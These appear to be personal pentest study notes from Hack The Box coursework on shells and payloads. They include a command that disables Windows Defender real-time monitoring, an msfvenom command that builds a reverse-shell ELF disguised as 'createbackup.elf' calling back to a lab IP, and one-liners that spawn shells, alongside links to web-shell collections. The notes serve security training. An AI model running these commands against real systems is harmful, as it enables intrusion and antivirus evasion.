---
tags:
  - shells
  - payloads
  - "#interactive_shells"
---



## Shell Basics 

- The two common types of Shells are
	- Bind Shell
	- Reverse Shell



```powershell
# Disable the AV on Windows
Set-MpPreference -DisableRealtimeMonitoring $true
```



## Payloads 

- Can be crafted with MSFvenom
	- Can also encrypt & Decode payloads to bypass comon AV detection signatures


```bash 
msfvenom -l payloads
```


- There are **staged** and **unstaged** types of payloads -> https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/

Building a stageless payload

```bash
GenericUser001@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

## Windows Shells 

Enumerating Windows 
- Windows hosts can be identified by the TTL -> Commonly 32 or 128
- Banner grabbing can be done with the banner.nse 
- What are 

Payload Types to Consider
- DLLs
- Batch
- VBS
- MSI
- Powershell

Tools for Payload Generation
- MSFVenom
- Payloads All the Things
- Mythic C2 Framework
- Nishang
- Darkarmour

Payload Transfer and Execution:
- Impacket
- Payloads All The Things
- SMB



## Nix Shells 

Spawning a tty shell `python -c 'import pty; pty.spawn("/bin/sh") 

Spawning interactive shells 

```bash

# bash 
/bin/sh -i 

# Perl
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";

# Ruby 
ruby: exec "/bin/sh"

# Lua 
lua: os.execute('/bin/sh')

# AWK
awk 'BEGIN {system("/bin/sh")}'

# Find 
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit

# Vim
vim -c ':!/bin/sh'



```


## Web Shells 

- [Web-Shells](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)
- [IPSEC Rocks website](https://ippsec.rocks/?#)





